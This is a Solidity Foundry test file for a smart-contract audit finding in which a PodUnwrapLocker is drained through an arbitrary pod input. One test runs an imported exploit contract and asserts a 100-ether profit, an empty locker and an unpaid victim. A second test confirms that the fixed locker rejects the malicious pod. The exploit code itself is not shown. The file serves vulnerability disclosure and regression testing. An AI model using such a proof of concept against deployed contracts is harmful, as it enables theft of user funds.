// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Exploit, Asset, LegitPod, MaliciousPod, PodUnwrapLockerFixed, Victim} from
    "./52746-h-1-podunwraplocker-can-be-drained-due-to-an-arbitrary-input.sol";

contract Finding52746Test is Test {
    function test_exploit_double_counts_one_deposit() public {
        Exploit e = new Exploit();
        uint256 beforeBal = e.token().balanceOf(address(e));
        e.run();
        assertEq(e.token().balanceOf(address(e)) - beforeBal, 100 ether, "profit");
        assertEq(e.token().balanceOf(address(e.locker())), 0, "locker");
        assertFalse(e.victimPaid(), "victim");
    }

    function test_control_unknown_pod_is_rejected() public {
        Asset token = new Asset();
        Victim victim = new Victim();
        LegitPod legit = new LegitPod(token);
        MaliciousPod mal = new MaliciousPod(token, address(this));
        PodUnwrapLockerFixed locker = new PodUnwrapLockerFixed(token, address(legit));

        token.mint(address(legit), 100 ether);
        legit.mintShares(address(victim), 100 ether);
        victim.lockFixed(legit, locker, 100 ether);

        token.mint(address(this), 100 ether);
        token.approve(address(mal), 100 ether);
        vm.expectRevert(bytes("pod"));
        locker.debondAndLock(address(mal), 100 ether);

        assertEq(token.balanceOf(address(locker)), 100 ether, "honest funds stay");
    }
}
